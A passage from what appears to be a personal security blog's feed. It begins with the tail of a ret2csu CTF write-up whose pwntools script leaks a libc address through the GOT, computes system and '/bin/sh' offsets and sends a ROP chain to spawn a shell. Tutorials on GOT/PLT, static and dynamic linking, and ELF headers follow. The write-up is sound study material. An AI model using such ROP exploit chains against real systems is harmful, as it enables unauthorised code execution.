&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'write'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'write'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011b0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'main'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# log.info(&quot;write leak: {}&quot;.format((hex(u64(p.recv(8))))))
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Write leak: {}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbbdc0&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa63da&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;b&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x40116b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#ret
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x00000000004011d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#pop rdi 
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binsh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>tourpran</name></author><category term="writeup" /><category term="csu" /><category term="ret2csu" /><category term="dicegang" /><summary type="html">Challenge Description</summary></entry><entry><title type="html">Global Offset Table and Procedure Linkage Table</title><link href="http://localhost:4000/blogs/blogs/2020/09/13/got-plt.html" rel="alternate" type="text/html" title="Global Offset Table and Procedure Linkage Table" /><published>2020-09-13T00:00:00+05:30</published><updated>2020-09-13T00:00:00+05:30</updated><id>http://localhost:4000/blogs/blogs/2020/09/13/got-plt</id><content type="html" xml:base="http://localhost:4000/blogs/blogs/2020/09/13/got-plt.html">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;h3 id=&quot;where-and-why-&quot;&gt;where and why ?&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;So Before diving into the concepts and working of GOT and PLT. Lets understand why we need them and where we need them.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So, In modern days we cant always compile the libraries or dependencies along with the binary. So the alternative option is to use Dynamic Linking. With advantages comes some complexity :P. So we dont know the address of functions that are used in the binary which are indeed defined in the dependency. So each time the binary runs the address needs to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolved&lt;/code&gt;. This cool process is done with the help of GOT and PLT. Also these are not functions. They are just tables as the names suggest.&lt;/p&gt;

&lt;h2 id=&quot;sample-code&quot;&gt;Sample Code&lt;/h2&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello World&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome to my blog&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;now compile this with no pie and 64 bit for further ease.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc test.c -o test -no-pie
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now this is Dynamically Linked (GCC does Dynamic Linking by default). So lets us run this… Works fine.&lt;/p&gt;

&lt;h2 id=&quot;gdb-code-analysis&quot;&gt;GDB Code Analysis&lt;/h2&gt;

&lt;p&gt;So let us use GDB (me - GDB-PEDA). Now disassemble the main and check for printf that we implemented. Hmm.. Weird We dont see it. If you read my previous blog you would know why. In short this is for efficiency. Do notice that the puts is actually termed puts@plt.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Set a breakpoint at puts@plt&lt;/li&gt;
  &lt;li&gt;run the program
We come to puts@plt instead of next step let us single step to see what is there in the puts@plt. 
&lt;img src=&quot;/assets/images/got1.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now in the disassembly we can see that its not really puts function, We landed in the plt section of puts. Yes!! Procedure Linkage &lt;strong&gt;Table&lt;/strong&gt;. Its basically a table which does a jump to the Global Offset Table for that particular entry, “puts”. Also remember this “GOT” is located in the .got section in the binary.&lt;/p&gt;

&lt;p&gt;Now we know that the got will not be filled with the address of puts as this is the first time this LIBC function is being called. So instead of real address of puts the got section of puts will contain the address of next instruction, which is a push followed by another jump. This push of a number &lt;strong&gt;can&lt;/strong&gt; be imagined as the index of the string “puts” in the string table. Next the jump is to the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_runtime_resolve&lt;/code&gt;. Yes this is the resolver,&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;dl runtime resolve&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This function will take the string as input and will find the real address of puts in libc and finally will change the GOT entry for puts. So due to this the function puts need not be searched again in the libc but can be directly taken from the got.&lt;/p&gt;

&lt;p&gt;This whole process can be imagined this way.
&lt;img src=&quot;/assets/images/got2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;end&quot;&gt;end&lt;/h2&gt;
&lt;p&gt;End of story. Great now you know a little bit of how GOT and PLT works.&lt;/p&gt;</content><author><name>tourpran</name></author><category term="Blogs" /><category term="got" /><category term="plt" /><category term="dynamic linking" /><summary type="html">Introduction</summary></entry><entry><title type="html">Dynamic and Static Linking</title><link href="http://localhost:4000/blogs/blogs/2020/09/11/blog2.html" rel="alternate" type="text/html" title="Dynamic and Static Linking" /><published>2020-09-11T00:00:00+05:30</published><updated>2020-09-11T00:00:00+05:30</updated><id>http://localhost:4000/blogs/blogs/2020/09/11/blog2</id><content type="html" xml:base="http://localhost:4000/blogs/blogs/2020/09/11/blog2.html">&lt;h2 id=&quot;start&quot;&gt;start:&lt;/h2&gt;

&lt;p&gt;Before going on to static and Dynamic linkning let us understand linking.&lt;/p&gt;

&lt;h2 id=&quot;linking&quot;&gt;Linking:&lt;/h2&gt;
&lt;p&gt;Linking - It is the process where something is being connected to something else. Suppose you call functions that is not defined in your binary and has to be used from some dependencies. There &lt;strong&gt;Linking&lt;/strong&gt; comes into picture.&lt;/p&gt;

&lt;h2 id=&quot;sample-program&quot;&gt;sample program&lt;/h2&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello World&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Welcome to my blog&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This will just print 2 strings to the terminal. Nothing intresting and complicated. Now let us compile this with static flag set.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc --static test.c -o test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;code-analysis&quot;&gt;Code Analysis&lt;/h2&gt;

&lt;p&gt;Now this is statically compiled. Let us try to analyse the code and see how the printf function is called.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;note: Printf is a libc function, which means it is not included in the binary and is been imported from a external dependency.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;so open gdb and disassembly main
&lt;img src=&quot;/assets/images/main.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that there is a normal puts. Do you remember we used printf in our function. This means the compiler plays god and decides the best function to be used in that place. Since puts is more efficient than printf it was implemented there. Instead when you use format strings in printf then puts cant be implemented in that case.
set a break point at puts and run the program.
&lt;img src=&quot;/assets/images/main1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now we see we go into the function puts. which has an address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4118c0&lt;/code&gt;. Now is this address kinda giving you an idea ? Yup ! This is our binary. If we do a vmmap (virtual memory mapping) then we can see that the address from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00400000&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x004e7000&lt;/code&gt; are inside the binary. Now we can say that the puts function is inside the binary so its address is also known at runtime.&lt;/p&gt;

&lt;h2 id=&quot;pros-and-cons&quot;&gt;Pros and Cons&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;Advantage&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;disadvantage&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;Anybody having the binary can excecute it. There will be no dependency errors&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;In real Life the applications are pretty huge and need multiple dependency files. Combining all of them into one file will make the size of the binary pretty huge.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;dynamic-linking&quot;&gt;Dynamic Linking&lt;/h2&gt;

&lt;p&gt;Time to move on to the complicated stuff. To compile it as dynamic, you have to do a normal gcc compilation as GCC compiles everything into Dynamic linking by default.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc test.c -o test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;code-analysis-1&quot;&gt;Code Analysis&lt;/h2&gt;

&lt;p&gt;We know for a fact that the functions are not going to be inside our binary. The binary being smart will store the names of dependencies that our needed to excecute this file.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Mr. Dynamic Linker&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The Dynamic Linker will link all the dependencies to the binary.&lt;/p&gt;

&lt;p&gt;First before excecuting the elf the system will excecute interpreter, which is a program that sets up the environment for excecuting the binary, this is done with the help of .dynamic section.
This program (interpreter) lies in the pt_interp segment which is created by the ld (compile-time linker).&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;readelf -d test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/main3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;NEEDED : contains the names of all the dependencies.&lt;/li&gt;
  &lt;li&gt;DT_SYMTAB : Address of the dynamic symbol table. 
so on…&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;steps&quot;&gt;steps&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;First the dynamic linker will load the excecutable into memory.&lt;/li&gt;
  &lt;li&gt;Next will load the dependencies which are mentioned in the binary.&lt;/li&gt;
  &lt;li&gt;Relocation - shared libraries are loaded into non-deterministic addresses.&lt;/li&gt;
  &lt;li&gt;then do some initialisation and go back to binary’s entry point / starting point&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/main5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;pros-and-cons-1&quot;&gt;Pros and Cons&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Advantage&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;disadvantage&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;People only need to have the dependencies installed once, that can be used for other binaries as well.&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;People who dont have the correct dependency will face a lot of problems(finding them).&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;lazy-linking&quot;&gt;Lazy Linking&lt;/h3&gt;

&lt;p&gt;Oops ! did I say that the linker performs all relocations. Well, thats not the case for most situations. This is where lazy linking comes into picture. So if a function is called then the dynamic linker will resolve the address for the function. Hence the name “Lazy” Linking. This awesome work is done by the GOT and PLT. (Next blog)&lt;/p&gt;

&lt;h2 id=&quot;end&quot;&gt;END&lt;/h2&gt;
&lt;p&gt;Good now that you understand some parts of Dynamic and Static linkning !!&lt;/p&gt;

&lt;h2 id=&quot;source&quot;&gt;source:&lt;/h2&gt;
&lt;p&gt;Really cool blog which made me understand this concept.
&lt;a href=&quot;https://www.intezer.com/blog/elf/executable-linkable-format-101-part-4-dynamic-linking/&quot;&gt;intezer&lt;/a&gt;&lt;/p&gt;</content><author><name>tourpran</name></author><category term="Blogs" /><category term="dynamic" /><category term="static" /><category term="linkning" /><summary type="html">start:</summary></entry><entry><title type="html">Executable and Linkable Format - Sections and Segments</title><link href="http://localhost:4000/blogs/blogs/2020/09/10/blog1.html" rel="alternate" type="text/html" title="Executable and Linkable Format - Sections and Segments" /><published>2020-09-10T00:00:00+05:30</published><updated>2020-09-10T00:00:00+05:30</updated><id>http://localhost:4000/blogs/blogs/2020/09/10/blog1</id><content type="html" xml:base="http://localhost:4000/blogs/blogs/2020/09/10/blog1.html">&lt;h2 id=&quot;start&quot;&gt;Start:&lt;/h2&gt;

&lt;p&gt;So the ELF or Excecutable and Linkable format are programs or binaries that are used in linux systems. ELFs contain 3 components namely:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ELF Headers&lt;/li&gt;
  &lt;li&gt;ELF Segments&lt;/li&gt;
  &lt;li&gt;ELF Sections&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;need&quot;&gt;Need:&lt;/h3&gt;

&lt;p&gt;A good reason to learn ELF format is it helps you to understand things easily when you do binary analysis or when you are curious to know how the Operating System works. There are several reasons why you need to know them …&lt;/p&gt;

&lt;h2 id=&quot;elf-headers&quot;&gt;ELF Headers&lt;/h2&gt;

&lt;p&gt;Firstly we will be looking at ELF which are 64 bits, dynamically linked, not stripped.
&lt;img src=&quot;/assets/images/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets look at the ELF header with readelf.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;readelf -h binary
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;magic&quot;&gt;magic&lt;/h3&gt;
&lt;p&gt;We can see from the image that our header / binary starts with the magic bytes Magic: 45 4c 46 which corresponds to ELF in ascii. This magic bytes tell the file command that this is an Excecutable and Linkable Format.&lt;/p&gt;

&lt;h3 id=&quot;class&quot;&gt;Class&lt;/h3&gt;
&lt;p&gt;This binary has a class of 64 bits because when I compiled, it was in a 64 bit machine so by default it will be 64 bits. Inorder to compile a 32 bit binary we need to give the -m32 flag to gcc.&lt;/p&gt;

&lt;h3 id=&quot;data&quot;&gt;Data&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Little Endian&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Big Endian&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The bytes of a word are arranged from right to left&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The bytes of a word are arranged from left to right&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The address of the word (assume 4 bytes) will point to 4 th bytes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;The address of that word (assume 4 bytes) will point to the 1st bytes&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;So in our case its little endian and most 64 bit amd processors compile it in little Endian.&lt;/p&gt;

&lt;h3 id=&quot;osabi&quot;&gt;OS/ABI&lt;/h3&gt;

&lt;p&gt;Nothing to tell about OS (Operating System). I compiled this is my laptop which is Linux hence Unix.&lt;/p&gt;

&lt;h3 id=&quot;machine&quot;&gt;Machine&lt;/h3&gt;

&lt;p&gt;Tells us we have x86 architecture with 64 bits.&lt;/p&gt;

&lt;h3 id=&quot;type&quot;&gt;type&lt;/h3&gt;

&lt;p&gt;Not sure why its DYN(Shared Object). It should have been EXEC (Executable file).[will update soon].&lt;/p&gt;

&lt;h3 id=&quot;rest&quot;&gt;Rest&lt;/h3&gt;

&lt;p&gt;Rest of the information is regarding addresses and Size of sections and headers.&lt;/p&gt;

&lt;h2 id=&quot;segments-aka-program-headers&quot;&gt;Segments (aka Program Headers)&lt;/h2&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;readelf -h ``binary``
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a array of structures. Each describes the segments. The segments are used to tell, how to create a memory image when the binary is excecuted. When the Kernel sees these segments it will map them into the Virtual Memory with the help of mmap system call.&lt;/p&gt;

&lt;h3 id=&quot;phdr&quot;&gt;PHDR&lt;/h3&gt;

&lt;p&gt;Tells the location of the Program header itself if its present.&lt;/p&gt;

&lt;h3 id=&quot;interp&quot;&gt;interp&lt;/h3&gt;

&lt;p&gt;specifies the location and size of a null-terminated path name to invoke as an interpreter&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;interpreter&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;ul&gt;
      &lt;li&gt;It is a program that excecutes certain specified instructions [not to worry now].&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;dynamic&quot;&gt;dynamic&lt;/h3&gt;

&lt;p&gt;This segment specifies the information needed for the dynamic linking process.&lt;/p&gt;

&lt;h3 id=&quot;gnu_eh_frame&quot;&gt;GNU_EH_FRAME&lt;/h3&gt;

